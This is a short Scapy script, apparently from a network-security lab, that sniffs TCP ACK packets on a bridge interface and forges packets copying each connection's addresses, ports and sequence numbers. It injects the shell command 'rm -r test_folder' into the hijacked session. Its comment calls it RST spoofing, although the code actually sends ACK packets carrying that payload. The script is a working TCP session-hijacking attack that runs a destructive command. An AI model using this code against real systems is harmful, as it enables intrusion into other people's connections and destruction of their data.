from scapy.all import *

# Spoofing TCP RST packet
def spoof_rst(pkt):

    ip  = IP(src=pkt[IP].src, dst=pkt[IP].dst)
    tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="A", seq=pkt[TCP].seq, ack=pkt[TCP].ack)

    data = "\r rm -r test_folder\r"
    spoofed_pkt = ip/tcp/data
    ls(spoofed_pkt)
    send(spoofed_pkt, verbose=0)



f = 'tcp[13] & 16 != 0 && ether src host not 02:42:7b:75:50:9a' # Only Captures TCP Ack packets
pkt = sniff(iface='br-fa53911b5ec8', filter=f, prn=spoof_rst)